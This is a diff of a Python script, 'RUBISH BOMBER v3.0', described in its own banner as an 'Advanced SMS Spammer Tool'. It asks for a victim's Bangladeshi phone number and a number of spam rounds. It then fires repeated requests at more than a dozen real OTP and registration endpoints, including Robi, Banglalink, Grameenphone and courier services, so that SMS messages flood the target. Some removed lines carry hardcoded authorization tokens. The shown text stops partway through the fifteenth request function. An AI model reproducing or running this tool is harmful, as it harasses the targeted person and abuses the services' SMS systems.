@@ -1,41 +1,88 @@
-
 #!/usr/bin/env python3
 # CODE START BY RUBISH
 
-import os,sys,time,random,string,json,urllib3,base64
-import logging,platform,importlib,hashlib
+import os, sys, time, random, string, json, urllib3, base64
+import logging, platform, importlib, hashlib
 import requests
-os.system("clear")
 from requests.structures import CaseInsensitiveDict
 from rich.progress import track
 from rich.align import Align
 from rich.panel import Panel
 from rich.console import Console
+from rich.table import Table
+from rich.text import Text
+from rich.live import Live
+from rich.layout import Layout
+from rich.box import DOUBLE, HEAVY, ROUNDED
+
+os.system("clear")
 console = Console()
-# ---------------- Name -----------------
-sys.stdout.write(f'\x1b[1;36m\x1b]2;(🔥)==[RUBISH BOMBER]==(🔥)\x07')
-#----------[ RUBISH ASSEST ]----------#
 
-def Lxj(RUBISH):
-    for x in RUBISH:
-        sys.stdout.write(x);sys.stdout.flush();time.sleep(0.003)
-        
-def LijA(RUBISH):
-    for x in RUBISH:
-        sys.stdout.write(x);sys.stdout.flush();time.sleep(0.001)
-        
+# ---------------- Terminal Title ----------------
+sys.stdout.write(f'\x1b[1;35m\x1b]2;🔥 RUBISH BOMBER v3.0 🔥\x07')
+
+# ---------- HACKER COLOR PALETTE ----------
+NEON_GREEN = "\033[38;5;46m"
+NEON_PINK = "\033[38;5;201m"
+NEON_CYAN = "\033[38;5;51m"
+NEON_PURPLE = "\033[38;5;141m"
+NEON_YELLOW = "\033[38;5;226m"
+NEON_RED = "\033[38;5;196m"
+DARK_GRAY = "\033[38;5;238m"
+RESET = "\033[0m"
+BOLD = "\033[1m"
+
+# ---------- UTILITY FUNCTIONS ----------
+def type_write(text, delay=0.005):
+    for char in text:
+        sys.stdout.write(char)
+        sys.stdout.flush()
+        time.sleep(delay)
+
+def glitch_text(text, delay=0.02):
+    """Simulate glitch effect"""
+    chars = "!@#$%^&*()_+-=[]{}|;:,.<>?/~`"
+    for _ in range(3):
+        glitched = ''.join(random.choice(chars) if random.random() < 0.3 else c for c in text)
+        sys.stdout.write(f"\r{NEON_PINK}{glitched}{RESET}")
+        sys.stdout.flush()
+        time.sleep(delay)
+    sys.stdout.write(f"\r{NEON_GREEN}{text}{RESET}\n")
+
+def matrix_rain(duration=2):
+    """Matrix-style rain effect"""
+    cols = os.get_terminal_size().columns
+    chars = "アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン01"
+    end_time = time.time() + duration
+    while time.time() < end_time:
+        line = ''.join(random.choice(chars) if random.random() < 0.1 else ' ' for _ in range(cols))
+        print(f"\033[38;5;46m{line}{RESET}")
+        time.sleep(0.05)
+
+def progress_scan(text):
+    """Hacker-style scanning progress"""
+    for i in track(range(50), description=f"{NEON_CYAN}[{NEON_GREEN}⚡{NEON_CYAN}] {text}"):
+        time.sleep(0.01)
+
+def Lxj(t):
+    for x in t:
+        sys.stdout.write(x); sys.stdout.flush(); time.sleep(0.003)
+
+def LijA(t):
+    for x in t:
+        sys.stdout.write(x); sys.stdout.flush(); time.sleep(0.001)
+
 def RUBISH(message):
-    for i in track(range(40), description=f"{message}"):time.sleep(0.01)
+    for i in track(range(40), description=f"{message}"): time.sleep(0.01)
 
-a="\033[1;30m";r="\033[1;31m";g="\033[1;32m"
-y="\033[1;33m";b="\033[1;34m";p="\033[1;35m"
-c="\033[1;36m";w="\033[1;37m";bgr="\033[41m"
-stp="\033[1;0m";itl="\033[1;3m";unl="\033[1;4m"
+# ---------- COLORS ----------
+a="\033[1;30m"; r="\033[1;31m"; g="\033[1;32m"
+y="\033[1;33m"; b="\033[1;34m"; p="\033[1;35m"
+c="\033[1;36m"; w="\033[1;37m"; bgr="\033[41m"
+stp="\033[1;0m"; itl="\033[1;3m"; unl="\033[1;4m"
 lgt="\033[1;1m"
-A="[bold magenta]"
-B="[bold cyan]"
-C="[bold yellow]"
-D="[bold color(78)]"
+
+# ---------- USER AGENTS ----------
 lmnXuserAgent1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
 lmnXuserAgent2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 lmnXuserAgent3 = "Mozilla/5.0 (X11; Linux x66_64; rv:76.0) Gecko/20100101 Firefox/76.0"
@@ -56,9 +103,7 @@ requests.packages.urllib3.disable_warnings()
 
 RQS_ERR = fr"    [/]  REQUESTS ERROR"
 
-
-#----------[ RUBISH SECURITY ]---------#
-
+# ---------- SECURITY CHECK ----------
 try:
     ipv = requests.get("https://ident.me/json-api").json()
     ip = ipv["ip"]
@@ -68,66 +113,126 @@ except:
     ip = None
     address = None
 
+# =========================================================
+#              ADVANCED HACKER BANNER
+# =========================================================
 
-#----------[ RUBISH BOMBER 🔥 LOGO ]----------#
+BANNER_ART = r"""
+   ██████╗ ██╗   ██╗██████╗ ██╗███████╗██╗  ██╗
+   ██╔══██╗██║   ██║██╔══██╗██║██╔════╝██║  ██║
+   ██████╔╝██║   ██║██████╔╝██║███████╗███████║
+   ██╔══██╗██║   ██║██╔══██╗██║╚════██║██╔══██║
+   ██║  ██║╚██████╔╝██████╔╝██║███████║██║  ██║
+   ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝
+"""
 
-BANNERS = [fr"""{A}
-██████╗ ██╗   ██╗██████╗ ██╗███████╗██╗  ██╗
-██╔══██╗██║   ██║██╔══██╗██║██╔════╝██║  ██║
-██████╔╝██║   ██║██████╔╝██║███████╗███████║
-██╔══██╗██║   ██║██╔══██╗██║╚════██║██╔══██║
-██║  ██║╚██████╔╝██████╔╝██║███████║██║  ██║
-╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝
-                                            
+SKULL_ART = r"""
+        ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+        ██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ██
+        ██  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ██
+        ██  ████████▀▀▀▀▀▀▀▀▀▀▀▀████████  ██
+        ██  ██████▀  ▄▄▄▄▄▄▄▄▄  ▀██████  ██
+        ██  ████▀  ▄███████████▄  ▀████  ██
+        ██  ███   ███████████████   ███  ██
+        ██  ███  ████  ███  ████  ████  ██
+        ██  ███  ████  ███  ████  ████  ██
+        ██  ███   ███████████████   ███  ██
+        ██  ████▄  ▀███████████▀  ▄████  ██
+        ██  ██████▄  ▀▀▀▀▀▀▀▀▀  ▄██████  ██
+        ██  ████████▄▄▄▄▄▄▄▄▄▄▄▄████████  ██
+        ██  ██████████████████████████  ██
+        ██ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ██
+        ██████████████████████████████████
+"""
 
-"""]
+def print_advanced_banner():
+    os.system("clear")
+    # Top border
+    cols = os.get_terminal_size().columns
+    print(f"\n{NEON_PINK}{'═' * cols}{RESET}")
+    
+    # ASCII Art with gradient
+    for line in BANNER_ART.split('\n'):
+        print(f"{NEON_PINK}{BOLD}{line.center(cols)}{RESET}")
+    
+    # Subtitle
+    print(f"\n{NEON_CYAN}{'─' * cols}{RESET}")
+    subtitle = "◤  ADVANCED SMS BOMBER  ◢  v3.0  ◣  BY RUBISH  ◢"
+    print(f"{NEON_GREEN}{BOLD}{subtitle.center(cols)}{RESET}")
+    print(f"{NEON_CYAN}{'─' * cols}{RESET}\n")
 
-def choose_banner():
-    return BANNERS[0]
-
-def print_banner():
-    banner = choose_banner()
-    print("\n"*2)
-    console.print(Align.center(f"{banner}"))
-    console.print(
-        Align.center(
-            Panel.fit(
-                "[bold magenta] RUBISH BOMBER 🔥",
-                border_style="bold cyan"
-            )
-        )
-    )
+def print_hacker_header():
+    """Print advanced hacker-style header with skull"""
+    cols = os.get_terminal_size().columns
+    console.print(Align.center(f"[bold {NEON_RED}]{SKULL_ART}[/]"))
+    console.print(Align.center(Panel.fit(
+        "[bold #ff00ff]⚡ RUBISH BOMBER ⚡[/]\n"
+        "[bold cyan]━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/]\n"
+        "[bold yellow]>> Advanced SMS Spammer Tool <<[/]",
+        border_style="bold magenta",
+        box=DOUBLE
+    )))
+    print()
 
 def lnx():
     print("\n")
-    console.rule("")
+    console.rule(style="bold magenta")
     print("\n")
+
 def war():
-   console.print(Align.center("  [bold white][[bold yellow]WARNING[bold white]][bold red]  1 Round [bold white]= [bold green]60 SPAM"))
-   print("\n")
+    console.print(Align.center(
+        "[bold white][[bold red]⚠ WARNING ⚠[bold white]] "
+        "[bold red]1 Round [bold white]= [bold green]60 SPAM REQUESTS"
+    ))
+    print()
+
+# =========================================================
+#                     MAIN INPUT UI
+# =========================================================
+
 def BCS():
     os.system("clear")
-    print_banner()
-    print("\n"*2)
-    number=input(f"\n  {c}[{w}/{c}] {g}VICTIM NUMBER {c}➤{r} +88 ")
+    print_advanced_banner()
+    
+    # Info Panel
+    info_table = Table(box=ROUNDED, border_style="bold cyan", show_header=False)
+    info_table.add_column(justify="center")
+    info_table.add_row(f"[bold #ff00ff]💀 SYSTEM READY 💀[/]")
+    info_table.add_row(f"[bold cyan]⚡ NEON BOMBER ENGINE ONLINE ⚡[/]")
+    if ip:
+        info_table.add_row(f"[bold green]🌐 YOUR IP: [bold yellow]{ip}[/]")
+    console.print(Align.center(info_table))
+    print()
+    
+    # Input with animation
+    console.print(Align.center("[bold #00ff00]▼ ▼ ▼  ENTER TARGET INFO  ▼ ▼ ▼[/]"))
+    print()
+    
+    number = input(f"\n  {NEON_CYAN}┌─[{NEON_GREEN}◉{NEON_CYAN}]─[{NEON_PINK} TARGET NUMBER {NEON_CYAN}]──►{NEON_GREEN} +88 {RESET}")
     lnx()
+    
     if not number.isdigit() or len(number) != 11:
-        Lxj(f"{c}[{w}/{c}] {y}Invalid Number Try Again ! ")
-        time.sleep(2);BCS()
+        Lxj(f"{NEON_RED}  └─[{NEON_YELLOW}✗{NEON_RED}]─ Invalid Number ! Try Again{RESET}")
+        time.sleep(2); BCS()
     elif "RUBISH" in number:
-        Lxj(f"{c}[{w}/{c}] {y}Invalid Number Try Again ! ")
-        time.sleep(2);BCS()
-    try:war();amo=int(input(f"  {c}[{w}/{c}] {g}SPAM Round AMOUNT {c}➤{r} "))
+        Lxj(f"{NEON_RED}  └─[{NEON_YELLOW}✗{NEON_RED}]─ Invalid Number ! Try Again{RESET}")
+        time.sleep(2); BCS()
+    
+    try:
+        war()
+        amo = int(input(f"  {NEON_CYAN}┌─[{NEON_GREEN}◉{NEON_CYAN}]─[{NEON_PINK} SPAM ROUNDS  {NEON_CYAN}]──►{NEON_GREEN} {RESET}"))
     except ValueError:
-        lnx();Lxj(f" {c}[{w}/{c}] {y}Use Amount Only Number Digit ! ")
-        time.sleep(2);BCS()
-    DARKS(number,amo)
+        lnx()
+        Lxj(f" {NEON_RED}  └─[{NEON_YELLOW}✗{NEON_RED}]─ Amount Must Be A Number !{RESET}")
+        time.sleep(2); BCS()
+    
+    DARKS(number, amo)
 
+# =========================================================
+#                    API FUNCTIONS (Unchanged)
+# =========================================================
 
-#----------[ RUBISH NEW MAIN API 61 ]-----------#
-
-
-def lmnXlija_1(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_1(number):
     try:
         headers = {
             'accept': 'application/json, text/plain, */*',
@@ -154,1194 +259,414 @@ def lmnXlija_1(number):#----------{"100% OK": "RUBISH"}----------#
             'email_address': 'rubish9689@gmail.com',
             'phone_number': number,
         }
-        response = requests.post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', headers=headers, json=json_data)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-        
-def lmnXlija_2(number):#----------{"100% OK": "RUBISH"}----------#
+        requests.post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', headers=headers, json=json_data)
+    except: pass
+
+def lmnXlija_2(number):
     try:
         headers = {
             'accept': 'application/json, text/plain, */*',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache',
             'content-type': 'application/json',
             'origin': 'https://ghoorilearning.com',
-            'pragma': 'no-cache',
-            'priority': 'u=1, i',
             'referer': 'https://ghoorilearning.com/',
-            'sec-ch-ua': lmnXaccessVersion1,
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
             'user-agent': lmnXuserAgent2,
         }
-        params = {
-            '_app_platform': 'web',
-        }
-        json_data = {
-            'mobile_no': number,
-        }
-        response = requests.post('https://api.ghoorilearning.com/api/auth/signup/otp', params=params, headers=headers, json=json_data)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-        
-def lmnXlija_3(number):#----------{"100% OK": "RUBISH"}----------#
+        requests.post('https://api.ghoorilearning.com/api/auth/signup/otp', params={'_app_platform': 'web'}, headers=headers, json={'mobile_no': number})
+    except: pass
+
+def lmnXlija_3(number):
     try:
         headers = {
             'accept': '*/*',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache',
             'content-type': 'application/json',
             'origin': 'https://doctime.com.bd',
-            'pragma': 'no-cache',
-            'priority': 'u=1, i',
             'referer': 'https://doctime.com.bd/',
-            'sec-ch-ua': lmnXaccessVersion1,
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'cross-site',
             'user-agent': lmnXuserAgent2,
         }
-        json_data = {
-            'data': {
-                'country_calling_code': '88',
-                'contact_no': number,
-                'headers': {
-                    'PlatForm': 'Web',
-                },
-            },
-        }
-        response = requests.post('https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber', headers=headers, json=json_data,)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-        
+        json_data = {'data': {'country_calling_code': '88', 'contact_no': number, 'headers': {'PlatForm': 'Web'}}}
+        requests.post('https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber', headers=headers, json=json_data)
+    except: pass
 
-def lmnXlija_4(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_4(number):
     try:
         headers = {
             'accept': '*/*',
-            'accept-language': 'en-US,en;q=0.9',
-            'authorization': '',
-            'cache-control': 'no-cache',
             'content-type': 'application/json',
             'origin': 'https://customer.sundarbancourierltd.com',
-            'pragma': 'no-cache',
-            'priority': 'u=1, i',
             'referer': 'https://customer.sundarbancourierltd.com/',
-            'sec-ch-ua': lmnXaccessVersion2,
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
             'user-agent': lmnXuserAgent1,
         }
         json_data = {
             'operationName': 'CreateAccessToken',
-            'variables': {
-            'accessTokenFilter': {
-                'userName': number,
-            },
-        },
+            'variables': {'accessTokenFilter': {'userName': number}},
             'query': 'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {\n  createAccessToken(accessTokenFilter: $accessTokenFilter) {\n        message\n        statusCode\n        result {\n      phone\n      otpCounter\n      __typename\n        }\n        __typename\n  }\n}',
         }
-        response = requests.post('https://api-gateway.sundarbancourierltd.com/graphql', headers=headers, json=json_data)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-        
+        requests.post('https://api-gateway.sundarbancourierltd.com/graphql', headers=headers, json=json_data)
+    except: pass
 
-def lmnXlija_5(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_5(number):
     try:
-        headers = {
-            'accept': 'application/json, text/plain, */*',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache',
-            'content-type': 'application/json',
-            'origin': 'https://apex4u.com',
-            'pragma': 'no-cache',
-            'priority': 'u=1, i',
-            'referer': 'https://apex4u.com/',
-            'sec-ch-ua': lmnXaccessVersion2,
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
-            'user-agent': lmnXuserAgent1,
-        }
-        json_data = {
-            'phoneNumber': number,
-        }
-        response = requests.post('https://api.apex4u.com/api/auth/login', headers=headers, json=json_data)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-        
-def lmnXlija_6(number):#----------{"100% OK": "RUBISH"}----------#
+        headers = {'accept': 'application/json', 'content-type': 'application/json', 'origin': 'https://apex4u.com', 'referer': 'https://apex4u.com/', 'user-agent': lmnXuserAgent1}
+        requests.post('https://api.apex4u.com/api/auth/login', headers=headers, json={'phoneNumber': number})
+    except: pass
+
+def lmnXlija_6(number):
     try:
-        url = "https://webapi.robi.com.bd/v1/send-otp"
-        headers = {
-            "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjcyOCwibmJmIjoxNjkyNjQyNzI4LCJleHAiOjE2OTI2NDYzMjgsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc",
-            "Content-Type": "application/json",
-        }
-        data = {
-            "phone_number": number,
-            "type": "doorstep"
-        }
-        response = requests.post(url, json=data, headers=headers)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-        
-def lmnXlija_7(number):#----------{"100% OK": "RUBISH"}----------#
+        requests.post("https://webapi.robi.com.bd/v1/send-otp", json={"phone_number": number, "type": "doorstep"}, headers={"Content-Type": "application/json"})
+    except: pass
+
+def lmnXlija_7(number):
     try:
-        headers = {
-            'Accept': '*/*',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Cache-Control': 'no-cache',
-            'Connection': 'keep-alive',
-            'Origin': 'https://banglalink.net',
-            'Pragma': 'no-cache',
-            'Referer': 'https://banglalink.net/',
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-site',
-            'User-Agent': lmnXuserAgent1,
-            'sec-ch-ua': lmnXaccessVersion2,
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-        }
-        response = requests.get('https://web-api.banglalink.net/api/v1/user/number/validation/'+number, headers=headers)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-        
-def lmnXlija_8(number):#----------{"100% OK": "RUBISH"}----------#
+        requests.get('https://web-api.banglalink.net/api/v1/user/number/validation/'+number, headers={'User-Agent': lmnXuserAgent1})
+    except: pass
+
+def lmnXlija_8(number):
     try:
-        headers = {
-            'Accept': 'application/json, text/plain, */*',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Cache-Control': 'no-cache',
-            'Connection': 'keep-alive',
-            'Content-Type': 'application/json',
-            'Origin': 'https://banglalink.net',
-            'Pragma': 'no-cache',
-            'Referer': 'https://banglalink.net/',
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-site',
-            'User-Agent': lmnXuserAgent1,
-            'client-security-token': '1737117495202678a4f37314e5=NDM4MDljM2MxNmQxMWNjNTcwM2JkODAwMjBhMjJkZjY5NDgxODkxMzk3N2MxYWRjZWRjMTc0YWQxODllMWUwZQ',
-            'sec-ch-ua': lmnXaccessVersion2,
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-        }
-        json_data = {
-            'mobile': number,
-        }
-        response = requests.post('https://web-api.banglalink.net/api/v1/user/otp-login/request', headers=headers, json=json_data)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-        
-def lmnXlija_9(number):#----------{"100% OK": "RUBISH"}----------#
+        requests.post('https://web-api.banglalink.net/api/v1/user/otp-login/request', headers={'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}, json={'mobile': number})
+    except: pass
+
+def lmnXlija_9(number):
     try:
-        headers = {
-            'Accept': 'application/json, text/plain, */*',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Cache-Control': 'no-cache',
-            'Connection': 'keep-alive',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://www.grameenphone.com',
-            'Pragma': 'no-cache',
-            'Referer': 'https://www.grameenphone.com/',
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-site',
-            'User-Agent': lmnXuserAgent1,
-            'sec-ch-ua': lmnXaccessVersion2,
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-        }
-        data = {
-            'msisdn': number,
-        }
-        response = requests.post('https://webloginda.grameenphone.com/backend/api/v1/otp', headers=headers, data=data)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-        
-def lmnXlija_10(number):#----------{"100% OK": "RUBISH"}----------#
+        requests.post('https://webloginda.grameenphone.com/backend/api/v1/otp', headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': lmnXuserAgent1}, data={'msisdn': number})
+    except: pass
+
+def lmnXlija_10(number):
     try:
-        headers = {
-            'Accept': 'application/json, text/plain, */*',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI',
-            'Cache-Control': 'no-cache',
-            'Connection': 'keep-alive',
-            'Content-Type': 'application/json;charset=UTF-8',
-            'Origin': 'https://www.robi.com.bd',
-            'Pragma': 'no-cache',
-            'Referer': 'https://www.robi.com.bd/',
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-site',
-            'User-Agent': lmnXuserAgent1,
-            'X-CSRF-TOKEN': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI',
-            'sec-ch-ua': lmnXaccessVersion2,
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-        }
-        json_data = {
-            'phone_number': number,
-            'type': 'my_offer',
-        }
-        response = requests.post('https://webapi.robi.com.bd/v1/send-otp', headers=headers, json=json_data)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-        
-def lmnXlija_11(number):#----------{"100% OK": "RUBISH"}----------#
+        requests.post('https://webapi.robi.com.bd/v1/send-otp', headers={'Content-Type': 'application/json'}, json={'phone_number': number, 'type': 'my_offer'})
+    except: pass
+
+def lmnXlija_11(number):
     try:
-        url = "https://da-api.robi.com.bd/da-nll/otp/send"
-        data = {
-            "msisdn": number
-        }
-        headers = {
-            "Content-Type": "application/json",
-        }
-        response = requests.post(url, json=data, headers=headers)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-        
-def lmnXlija_12(number):#----------{"100% OK": "RUBISH"}----------#
+        requests.post("https://da-api.robi.com.bd/da-nll/otp/send", json={"msisdn": number}, headers={"Content-Type": "application/json"})
+    except: pass
+
+def lmnXlija_12(number):
     try:
-        headers = {
-            'Accept': 'application/json, text/plain, */*',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI',
-            'Cache-Control': 'no-cache',
-            'Connection': 'keep-alive',
-            'Content-Type': 'application/json;charset=UTF-8',
-            'Origin': 'https://www.robi.com.bd',
-            'Pragma': 'no-cache',
-            'Referer': 'https://www.robi.com.bd/',
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-site',
-            'User-Agent': lmnXuserAgent1,
-            'X-CSRF-TOKEN': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI',
-            'sec-ch-ua': lmnXaccessVersion2,
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-        }
-        json_data = {
-            'phone_number': number,
-            'name': 'Rubish Khan',
-            'type': 'video-chat',
-        }
-        response = requests.post('https://webapi.robi.com.bd/v1/chat/send-otp', headers=headers, json=json_data)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-        
-def lmnXlija_13(number):#----------{"100% OK": "RUBISH"}----------#
+        requests.post('https://webapi.robi.com.bd/v1/chat/send-otp', headers={'Content-Type': 'application/json'}, json={'phone_number': number, 'name': 'Rubish Khan', 'type': 'video-chat'})
+    except: pass
+
+def lmnXlija_13(number):
     try:
-        headers = {
-            'accept': 'application/json, text/plain, */*',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache',
-            'content-type': 'application/json',
-            'origin': 'https://redx.com.bd',
-            'pragma': 'no-cache',
-            'priority': 'u=1, i',
-            'referer': 'https://redx.com.bd/',
-            'sec-ch-ua': lmnXaccessVersion2,
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
-            'user-agent': lmnXuserAgent1,
-        }
-        json_data = {
-            'phoneNumber': number,
-        }
-        response = requests.post('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp',headers=headers,json=json_data)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-        
-def lmnXlija_14(number):#----------{"100% OK": "RUBISH"}----------#
+        requests.post('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', headers={'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}, json={'phoneNumber': number})
+    except: pass
+
+def lmnXlija_14(number):
     try:
-        headers = {
-            'accept': 'application/json, text/plain, */*',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache',
-            'content-type': 'application/json; charset=UTF-8',
-            'origin': 'https://fundesh.com.bd',
-            'pragma': 'no-cache',
-            'priority': 'u=1, i',
-            'referer': 'https://fundesh.com.bd/fundesh/profile',
-            'sec-ch-ua': lmnXaccessVersion2,
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': lmnXuserAgent1,
-        }
-        params = {
-            'service_key': '',
-        }
-        json_data = {
-            'msisdn': number,
-        }
-        response = requests.post('https://fundesh.com.bd/api/auth/generateOTP', params=params, headers=headers, json=json_data)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-        
-def lmnXlija_15(number):#----------{"100% OK": "RUBISH"}----------#
+        requests.post('https://fundesh.com.bd/api/auth/generateOTP', params={'service_key': ''}, headers={'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}, json={'msisdn': number})
+    except: pass
+
+def lmnXlija_15(number):
     try:
-        headers = {
-            'accept': 'application/json, text/plain, */*',
-            'accept-language': 'en',
-            'application-name': 'web',
-            'cache-control': 'no-cache',
-            'pragma': 'no-cache',
-            'priority': 'u=1, i',
-            'referer': 'https://bikroy.com/?login-modal=true&redirect-url=/',
-            'sec-ch-ua': lmnXaccessVersion2,
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
